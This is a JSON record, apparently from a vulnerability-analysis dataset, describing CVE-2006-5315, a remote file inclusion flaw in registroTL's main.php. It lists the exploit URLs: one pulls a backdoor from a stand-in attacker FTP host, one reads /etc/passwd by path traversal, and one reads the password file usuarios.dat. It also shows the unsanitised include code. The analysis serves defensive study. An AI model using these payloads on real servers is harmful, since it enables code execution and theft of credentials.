```
[
  {
    "ID": "CVE-2006-5315",
    "content": "The vulnerability lies in the `registroTL` application, specifically within the `main.php` file.\n\n**Root cause of vulnerability:**\nThe vulnerability is caused by an insecure implementation of file inclusion. The `main.php` script uses a GET parameter `page` to include a PHP file, but it does not properly sanitize the input.\n\n**Weaknesses/vulnerabilities present:**\n- **Remote File Inclusion (RFI):** The script includes a file based on user-supplied input in the `page` parameter without sufficient validation.\n- **Insufficient Input Validation:** The script only checks if the file exists after appending `.php` to the input, but does not prevent the inclusion of arbitrary URLs.\n\n**Impact of exploitation:**\n- **Arbitrary Code Execution:** An attacker can include remote PHP files containing malicious code, leading to the execution of arbitrary code on the server.\n- **Sensitive Information Disclosure:** By including local files, an attacker could potentially disclose sensitive information such as database credentials or user passwords.\n- **Password Disclosure:** The advisory specifically mentions the possibility of disclosing passwords by accessing `usuarios.dat`.\n\n**Attack vectors:**\n- HTTP GET request with the `page` parameter set to a remote URL.\n- HTTP GET request with the `page` parameter set to a local file path to disclose information.\n\n**Required attacker capabilities/position:**\n- The attacker needs to be able to send HTTP requests to the vulnerable web server.\n- The attacker needs to identify the vulnerable script and parameter.\n\n**Exploit Example:**\n`http://victim.com/main.php?page=ftp://hack.com/backdrphpext`\n`http://victim.com/main.php?page=../../../../etc/passwd`\n`http://victim.com/main.php?page=usuarios.dat`\n\n**Vulnerable Code:**\n```php\nif (isset($_GET['page']) && file_exists($_GET['page'].\".php\"))\n include($_GET['page'].\".php\");\n```",
    "related": true
  }
]
```